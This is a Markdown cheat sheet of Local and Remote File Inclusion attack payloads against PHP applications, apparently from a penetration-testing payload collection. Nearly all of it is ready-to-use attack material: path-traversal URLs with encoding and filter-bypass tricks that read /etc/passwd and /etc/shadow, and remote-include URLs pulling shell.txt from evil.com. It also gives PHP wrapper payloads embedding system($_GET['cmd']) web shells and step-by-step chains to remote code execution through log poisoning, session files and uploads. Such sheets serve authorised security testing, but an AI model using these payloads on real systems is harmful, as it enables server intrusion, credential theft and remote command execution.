# Local/Remote File Inclusion
The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a "dynamic file inclusion" mechanisms implemented in the target application.

Interesting files to check out :
```
/etc/issue
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/motd
/etc/mysql/my.cnf
/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
/proc/self/environ
/proc/version
/proc/cmdline
/proc/sched_debug
/proc/mounts
/proc/net/arp
/proc/net/route
/proc/net/tcp
/proc/net/udp
/var/log/apache/access.log
/var/log/apache/error.log
/var/log/httpd/error_log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/vsftpd.log
/var/log/sshd.log
/var/log/mail
```

## Basic LFI
```
http://example.com/index.php?page=../../../etc/passwd

Null byte
http://example.com/index.php?page=../../../etc/passwd%00

Double encoding
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00

Path truncation
http://example.com/index.php?page=../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\[ADD MORE]\.\.
http://example.com/index.php?page=../../../../[…]../../../../../etc/passwd

Filter bypass
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
```

## Basic RFI (null byte, double encoding and other tricks)
```
http://example.com/index.php?page=http://evil.com/shell.txt
http://example.com/index.php?page=http://evil.com/shell.txt%00
http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
```

## LFI / RFI Wrappers

LFI Wrapper rot13 and base64 - php://filter case insensitive
```
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php

can be chained with a compression wrapper
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
```


LFI Wrapper ZIP
```python
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;  
zip payload.zip payload.php;   
mv payload.zip shell.jpg;    
rm payload.php   

http://example.com/index.php?page=zip://shell.jpg%23payload.php
```


RFI Wrapper DATA with "<?php system($_GET['cmd']);echo 'Shell done !'; ?>" payload
```
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
```

RFI Wrapper EXPECT
```
http://example.com/index.php?page=php:expect://id
http://example.com/index.php?page=php:expect://ls
```

Bonus XSS    
XSS via RFI/LFI with "<svg onload=alert(1)>" payload
```
http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+
```

## LFI to RCE via /proc/*/fd
1. Upload a lot of shells (for example : 100)
2. Include http://example.com/index.php?page=/proc/$PID/fd/$FD
with $PID = PID of the process (can be bruteforced) and $FD the filedescriptor (can be bruteforced too)
/proc/self/environ can also be used


## LFI to RCE via Upload
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
You can injected the <?php system($_GET['c']); ?> into the metadata

## LFI to RCE via Phpinfo()
https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf
Use the script phpInfoLFI.py (also available at https://www.insomniasec.com/downloads/publications/phpinfolfi.py)


## LFI to RCE via input:// stream
Specify your payload in the POST parameters
```
http://example.com/index.php?page=php://input
POST DATA: <? system('id'); ?>
```

## LFI to RCE via controlled log file
Just append your PHP code into the log file and include it.
```
http://example.com/index.php?page=/var/log/apache/access.log
http://example.com/index.php?page=/var/log/apache/error.log
http://example.com/index.php?page=/var/log/vsftpd.log
http://example.com/index.php?page=/var/log/sshd.log
http://example.com/index.php?page=/var/log/mail
http://example.com/index.php?page=/var/log/httpd/error_log
http://example.com/index.php?page=/usr/local/apache/log/error_log
http://example.com/index.php?page=/usr/local/apache2/log/error_log
```

## LFI to RCE via PHP Sessions
Check if the website use PHP Session (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
In PHP these sessions are stored into /var/lib/php5/sess_[PHPSESSID] files
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Set the cookie to <?php system('cat /etc/passwd');?>
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Use the LFI to include the PHP session file
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
```


## Checklist - Common ways of upgrading from LFI to RCE
```
Using file upload forms/functions
Using the PHP wrapper expect://command
Using the PHP wrapper php://file
Using the PHP wrapper php://filter
Using PHP input:// stream
Using data://text/plain;base64,command
Using /proc/self/environ
Using /proc/self/fd
Using PHP Session
Using log files with controllable input like:
  /var/log/apache/access.log
  /var/log/apache/error.log
  /var/log/vsftpd.log
  /var/log/sshd.log
  /var/log/mail
```

## Thanks to
* [OWASP LFI](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion)
* [HighOn.coffee LFI Cheat](https://highon.coffee/blog/lfi-cheat-sheet/)
* [Turning LFI to RFI ](https://l.avala.mp/?p=241)
* [Is PHP vulnerable and under what conditions?](http://0x191unauthorized.blogspot.fr/2015/04/is-php-vulnerable-and-under-what.html)
* [Upgrade from LFI to RCE via PHP Sessions](https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions/)
* [Local file inclusion tricks](http://devels-playground.blogspot.fr/2007/08/local-file-inclusion-tricks.html)
